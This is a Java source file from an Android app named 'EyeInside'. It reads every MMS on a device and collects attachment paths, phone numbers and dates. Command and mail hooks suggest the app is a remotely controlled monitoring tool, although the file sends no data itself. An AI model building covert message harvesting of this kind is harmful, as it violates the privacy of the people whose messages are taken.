package com.code4bones.EyeInside;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

import com.code4bones.utils.Mail;
import com.code4bones.utils.NetLog;

final class handleMMS extends Handler {

	private Context mContext;
	private ArrayList<SmsObj> mFiles = new ArrayList<SmsObj>();
	
	public handleMMS(Context context) {
		mContext = context;
	}
	
	public static final Uri URI = Uri.parse("content://mms/");    
	public static final Uri URI_MMS = Uri.parse("content://mms/part");    

	public void handleMessage(Message msg) {
	   NetLog.v("******** MMS CHANGED");
		/*
	   CommandObj cmd = (CommandObj) msg.obj;
	   Cursor cur = mContext.getContentResolver().query(URI, null,null, null, "_id DESC");
       if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("MMS Cursor null");
    	   return;
       }
       
 		try {
				cmd.Reply(cur);
				cur.close();
			} catch (Exception e) {
				NetLog.v("handleSmsLog error: %s",e.getMessage());
				//cmd.replySMS("E: %s -> %s", cmd.commandName,e.getMessage());
		}
		*/
	} // handleMessage
	
	
	public void eachMMS() {
		Cursor cur = mContext.getContentResolver().query(URI, null, null, null, "_id DESC");
		if ( cur == null || !cur.moveToFirst() ) {
			NetLog.v("Not MMS Found!");
			return;
		}
		do {
			String _id = cur.getString(cur.getColumnIndex("_id"));
//			String tid = cur.getString(cur.getColumnIndex("thread_id"));
			Date  date = new Date(cur.getLong(cur.getColumnIndex("date")));
			eachPART(_id,date);
		} while ( cur.moveToNext());
	}
	
	public void eachADDR(String msg_id,SmsObj sms) {
		Uri uri = Uri.parse("content://mms/"+msg_id+"/addr");
		Cursor cur = mContext.getContentResolver().query(uri, null, "type=137 or type=151 AND msg_id=" + msg_id, null, null);
		if ( cur == null || !cur.moveToFirst() ) {
			NetLog.v("Not ADDR Found!");
			return;
		}
		do {
			String phone = cur.getString(cur.getColumnIndex("address"));
			long type = cur.getLong(cur.getColumnIndex("type"));
			if ( phone.equalsIgnoreCase("insert-address-token") == false )
				sms.addPhone(type,phone);
			
		} while ( cur.moveToNext());
	}
	
	public void eachPART(String _id,Date date) {
		Uri uriParts = Uri.parse("content://mms/"+_id+"/part");
		Cursor cur = mContext.getContentResolver().query(uriParts,null, null, null, null);
		if ( cur == null || !cur.moveToFirst() ) {
			NetLog.v("MMS Parts not found");
			return;
		}
		//for ( String col : cur.getColumnNames()) NetLog.v("PART/ %s -> %s",col,cur.getString(cur.getColumnIndex(col)));
		do {
			NetLog.v("************* PART ***************");
			String pid  = cur.getString(cur.getColumnIndex("_id"));
			//String content = cur.getString(cur.getColumnIndex("ct"));
			String name = cur.getString(cur.getColumnIndex("name"));
			String sdata = cur.getString(cur.getColumnIndex("_data"));
			
			if ( sdata != null ) {
				SmsObj sms = new SmsObj(mContext,pid,name,sdata);
				sms.date = sms.df.format(date);
				eachADDR(_id,sms);
				mFiles.add(sms);
			}
		} while ( cur.moveToNext());
	}
	
	public ArrayList<SmsObj> listMMS() {
		eachMMS();
		return mFiles;
	}
	
	
}



